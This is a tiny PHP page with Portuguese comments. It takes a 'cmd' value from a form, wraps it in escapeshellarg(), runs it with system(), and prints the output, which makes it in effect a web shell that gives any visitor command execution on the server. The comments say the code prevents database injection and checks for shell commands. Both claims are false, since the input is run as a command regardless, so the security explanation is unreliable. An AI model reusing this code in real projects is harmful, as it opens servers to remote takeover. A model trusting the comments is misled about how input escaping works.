<?php 
    //comando para evitar injeções em comandos para o banco de dados
    if($_SERVER["REQUEST_METHOD"] === "POST")
    {
        //verifica se há comandos shell
        $cmd = escapeshellarg($_POST["cmd"]);

        echo "<pre>";
        $comando = system($cmd, $return);
        echo "</pre>";
    }
?>

<form method="post">
    <input type="text" name="cmd">
    <input type="submit">
</form>